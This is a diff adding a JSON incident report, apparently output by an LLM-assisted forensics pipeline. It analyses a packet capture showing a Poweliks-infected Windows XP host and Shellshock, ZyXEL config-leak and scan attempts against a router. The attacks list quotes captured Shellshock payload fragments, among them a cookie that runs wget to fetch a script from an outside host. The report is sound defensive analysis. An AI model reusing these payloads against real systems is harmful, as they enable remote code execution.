@@ -1,0 +1,103 @@
+{
+  "_provenance": {
+    "note": "Kaggle 노트북 stdout(run.py 출력)에서 복원한 산출물. reports/ 는 gitignore 라 실제 파일 대신 이 사본을 보존한다.",
+    "commit": "59ed135",
+    "date": "2026-09-09",
+    "case": "q2",
+    "ablation": null,
+    "model": "qwen3.8:27b",
+    "think": "medium",
+    "num_ctx": 131072,
+    "hardware": "Kaggle T4 x2",
+    "metrics": {
+      "tier1": "http-view level=4, 49,819 chars ≈ 31,104 tokens (budget 78,643)",
+      "forensic": "1265s — prefill 30,731tok/134s(229tok/s) decode 14,403tok/1130s(12.8tok/s) thinking 25,018자",
+      "run_py_total_s": 1266,
+      "policy": "S1=18, S2=3, suricata -T PASS",
+      "narrative_s": 216
+    }
+  },
+  "verdict": "confirmed",
+  "grounds": [
+    "[코드 판정 — LLM triage 생략] 위협 카테고리 alert 10종 — 예: ET WEB_SERVER Possible CVE-2014-6271 Attempt in HTTP Cookie",
+    "[코드 승급] 침해 확정 호스트 1대 + c2 9건/해시 0건 — suspicious → confirmed"
+  ],
+  "pipeline_status": "ok",
+  "_llm_delta": {
+    "verdict_floor": "suspicious",
+    "verdict_full": "confirmed",
+    "iocs_added": ["136.243.24.249"],
+    "iocs_lost": [],
+    "domains_added": ["yjuggczkkq.gq"],
+    "victims_added": ["192.168.0.53"]
+  },
+  "analysis": {
+    "executive_summary": "192.168.0.53(password-ned-xp, Windows XP)이 Poweliks 멀웨어에 감염되어 88.214.241.199 및 136.243.24.249로 C2 통신(13/82 회선)을 수행하고, yjuggczkkq.gq 서브도메인 3개를 조회함. 한편 192.168.0.2(ZyXEL 라우터)에 대해 146.52.78.242(CVE-2014-6271, 802회)·60.250.33.201/66.135.38.206(Shellshock 계열)·91.217.90.49(ZyXEL 설정 유출)·61.240.144.64(Masscan)로부터 인바운드 공격이 집중되었으나 모두 403/404로 차단됨(성공 증거 없음). 192.168.0.54(Dell-Dator32)는 Dropbox·Skype·YouTube 등 정상 사용자 트래픽.",
+    "victims": [
+      {"ip": "192.168.0.53", "status": "compromised", "malware": ["Poweliks"], "mac": "00:60:6e:00:9d:f9", "hostname": "password-ned-xp", "username": null, "role": null},
+      {"ip": "192.168.0.2", "status": "unknown", "malware": [], "mac": "ec:f4:bb:4f:c0:d7", "hostname": null, "username": null, "role": null},
+      {"ip": "192.168.0.54", "status": "unknown", "malware": [], "mac": "ec:f4:bb:4f:b0:96", "hostname": "Dell-Dator32", "username": null, "role": null},
+      {"ip": "192.168.0.51", "status": "unknown", "malware": [], "mac": "ec:f4:bb:4f:b2:45", "hostname": "homer-xubuntu", "username": null, "role": null},
+      {"ip": "192.168.0.1", "status": "infrastructure", "malware": [], "mac": "78:54:2e:9f:10:28", "hostname": null, "username": null, "role": "dns_server"}
+    ],
+    "iocs": {
+      "c2": ["88.214.241.199", "136.243.24.249", "46.108.156.146", "146.52.78.242", "60.250.33.201", "61.240.144.64", "66.135.38.206", "91.217.90.49", "94.242.254.208"],
+      "delivery": [],
+      "exfil": [],
+      "domains": ["yjuggczkkq.gq", "zzwfbedgue.yjuggczkkq.gq", "gxgfwamxzl.yjuggczkkq.gq", "uugzv.yjuggczkkq.gq"],
+      "hashes": []
+    },
+    "timeline": [
+      {"ts": 1428537727.069534, "event": "192.168.0.53 → 136.243.24.249 랜덤 URL GET (200/404, C2 채널 최초 접촉)"},
+      {"ts": 1428537749.749841, "event": "192.168.0.53 → 0a0a.eu/1/index.php GET (200, 사기/광고 사이트)"},
+      {"ts": 1428537754.107356, "event": "192.168.0.53 DNS 조회 zzwfbedgue.yjuggczkkq.gq → 46.108.156.146"},
+      {"ts": 1428537754.282769, "event": "192.168.0.53 → 46.108.156.146:39349 GET (404)"},
+      {"ts": 1428538198.360456, "event": "192.168.0.53 DNS 조회 gxgfwamxzl.yjuggczkkq.gq → 46.108.156.146"},
+      {"ts": 1428538249.999034, "event": "192.168.0.53 → 136.243.24.249 15개 랜덤 URL GET (200, Base64 응답 — C2 데이터 교환)"},
+      {"ts": 1428538280.368995, "event": "192.168.0.53 → searchl.org 리다이렉트 체인 (302 → 88.214.241.199)"},
+      {"ts": 1428538714.137448, "event": "192.168.0.53 → 88.214.241.199/click GET (301, Poweliks C2 체크인)"},
+      {"ts": 1428538714.309737, "event": "Alert: ET MALWARE Poweliks Clickfraud CnC M4 (13회, 192.168.0.53 → 88.214.241.199)"},
+      {"ts": 1428538797.518599, "event": "91.217.90.49 → 192.168.0.2 /rom-0 GET (404, ZyXEL 설정 유출 시도)"},
+      {"ts": 1428542202.513636, "event": "192.168.0.53 → wellnessabout.com POST (200, 광고/사기 페이지)"},
+      {"ts": 1428545807.145163, "event": "60.250.33.201/66.135.38.206 → 192.168.0.2 CURL/WGET 명령 삽입 (400/404, Shellshock 계열)"},
+      {"ts": 1428545846.704294, "event": "146.52.78.242/60.250.33.201/66.135.38.206 → 192.168.0.2 printenv 접근 (6회)"},
+      {"ts": 1428568439.967791, "event": "146.52.78.242 → 192.168.0.2 CVE-2014-6271 쿠키 삽입 (802회, 403/404, 콜백 54.248.244.82 미확인)"},
+      {"ts": 1428574692.124516, "event": "192.168.0.54 → download.gfe.nvidia.com PE EXE 다운로드 (정상 드라이버)"},
+      {"ts": 1428590968.468012, "event": "61.240.144.64 → 192.168.0.2 Masscan 스캔 (1회)"}
+    ],
+    "patient_zero": "192.168.0.53",
+    "anomaly_analysis": [
+      "ff02::1:2(547)·ff02::c(1900)·ff02::fb(5353)·ff02::1:3(5355) — IPv6 멀티캐스트 mDNS/SSDP/LLMNR, 정상",
+      "194.71.144.71:123·188.126.88.9:123 — NTP 서버, 정상",
+      "94.242.254.208:80 (773 회선, no_dns_direct) — CDN/광고 서버로 추정, 위협 alert 없음 — IOC 승격 금지",
+      "exfil_candidates 전부 대형 서비스(YouTube 213.155.151.x, Google 216.58.209.x/74.125.232.x, Facebook 31.13.64.1) — 정상 사용자 트래픽",
+      "192.168.0.54 → 213.155.151.152:443 (112회) — YouTube 스트리밍, 정상",
+      "DNS NXDOMAIN 22.9% — pwned.se 검색 접미사(Windows 자동)로 설명 가능, 터널 아님",
+      "192.168.0.53 zeek_weird: bad_HTTP_request 다수(71.95.164.42, 107.131.28.185 등) — 감염 호스트의 변형 HTTP 요청과 일치",
+      "192.168.0.53 → 192.168.0.1:8080 UPnP SUBSCRIBE 148회 — 비정상적 빈도이나 라우터 설정 폴링으로 해석 가능, 별도 공격 신호 아님",
+      "136.243.24.249 응답 본문이 Base64 인코딩 데이터로 시작 — C2 명령/데이터 채널로 판단",
+      "yjuggczkkq.gq 3개 서브도메인 모두 46.108.156.146:39349로 해석 후 404 — C2 인프라로 추정하나 실제 페이로드 전달 확인 불가"
+    ],
+    "assessment": "192.168.0.53(password-ned-xp, Windows XP)이 Poweliks 멀웨어에 감염되어 88.214.241.199(C2 체크인 13회)와 136.243.24.249(데이터 교환 82회, Base64 응답)로 아웃바운드 C2 통신을 수행하고, yjuggczkkq.gq 서브도메인 3개를 DNS 조회(46.108.156.146, HTTP 404)한 것으로 확인됨. 감염 경로는 0a0a.eu·searchl.org 등 사기/광고 사이트 경유로 추정. 192.168.0.2(ZyXEL 라우터)에는 146.52.78.242(CVE-2014-6271 802회)·60.250.33.201/66.135.38.206(Shellshock 계열 126회)·91.217.90.49(ZyXEL 설정 유출 2회)·61.240.144.64(Masscan 1회)로부터 인바운드 공격이 집중되었으나, 응답이 403/404에 그치고 페이로드 서버(54.248.244.82)로 콜백한 기록이 없어 모두 시도(실패)로 판정. 192.168.0.54(Dell-Dator32)·192.168.0.51(homer-xubuntu)는 정상 사용자 트래픽. 측면이동·AD 자격증명 공격 미검출. 커버리지 한계: 암호화 채널(TLS) 내부 페이로드 미검사, 136.243.24.249의 Base64 응답이 실제 명령/유출인지 해독 불가, yjuggczkkq.gq(404)의 후속 활동 미확인, 24시간 캡처 외 시간대 미포함.",
+    "attacks": [
+      {"technique": "c2_checkin", "actor": "192.168.0.53", "target": "88.214.241.199", "sample_uri": "/click?sid=2f4df8d4641a1f9c2d43c9797e6279e2f55f6a97&cid=0", "disposition": "succeeded", "actor_scope": "internal", "target_scope": "external"},
+      {"technique": "c2_data_exchange", "actor": "192.168.0.53", "target": "136.243.24.249", "sample_uri": "/rZrnaWOtYlZ490QRMHUbiJQT9LyAtI/…(15 distinct, 200)", "disposition": "succeeded", "actor_scope": "internal", "target_scope": "external"},
+      {"technique": "c2_domain_resolution", "actor": "192.168.0.53", "target": "46.108.156.146", "sample_uri": "zzwfbedgue.yjuggczkkq.gq:39349/sullen/…(404)", "disposition": "attempted", "actor_scope": "internal", "target_scope": "external"},
+      {"technique": "exploit_cve_2014_6271", "actor": "146.52.78.242", "target": "192.168.0.2", "sample_uri": "/cgi-bin/ (COOKIE: () { :; }; wget -qO - http://54.248.244.82/s.php…)", "disposition": "attempted", "actor_scope": "external", "target_scope": "internal"},
+      {"technique": "exploit_shellshock_curl", "actor": "60.250.33.201", "target": "192.168.0.2", "sample_uri": "/cgi-bin/bash (HEADER: () { :;};/usr/bin/perl -e …)", "disposition": "attempted", "actor_scope": "external", "target_scope": "internal"},
+      {"technique": "exploit_shellshock_curl", "actor": "66.135.38.206", "target": "192.168.0.2", "sample_uri": "/lbin/webcommand.php (404)", "disposition": "attempted", "actor_scope": "external", "target_scope": "internal"},
+      {"technique": "exploit_zyxel_config_download", "actor": "91.217.90.49", "target": "192.168.0.2", "sample_uri": "/rom-0 (404)", "disposition": "attempted", "actor_scope": "external", "target_scope": "internal"},
+      {"technique": "scan_masscan", "actor": "61.240.144.64", "target": "192.168.0.2", "sample_uri": "Masscan (1회)", "disposition": "attempted", "actor_scope": "external", "target_scope": "internal"}
+    ],
+    "_excluded_benign_hashes": [
+      {"sha256": "6a34b09daeb0eba260faaf911a27e4e0af44313e98931f4a30bf940e5515aaa8", "serving_host": "o.aolcdn.com"},
+      {"sha256": "a8ab7f86c5615c113d8dba4c3b8dbe4a8fad7f2aa0462d2012aabba7383e07e9", "serving_host": "download.gfe.nvidia.com"}
+    ],
+    "_rejected_iocs": [
+      {"kind": "ip", "bucket": "delivery", "value": "54.248.244.82", "reason": "evidence 미관측 (오염/환각)"}
+    ],
+    "_c2_kept_despite_target_label": ["136.243.24.249", "46.108.156.146", "88.214.241.199", "zzwfbedgue.yjuggczkkq.gq:39349"],
+    "_iocs_added_inbound": ["146.52.78.242", "60.250.33.201", "61.240.144.64", "66.135.38.206", "91.217.90.49"],
+    "_iocs_added_dead_beacon": ["94.242.254.208"]
+  }
+}
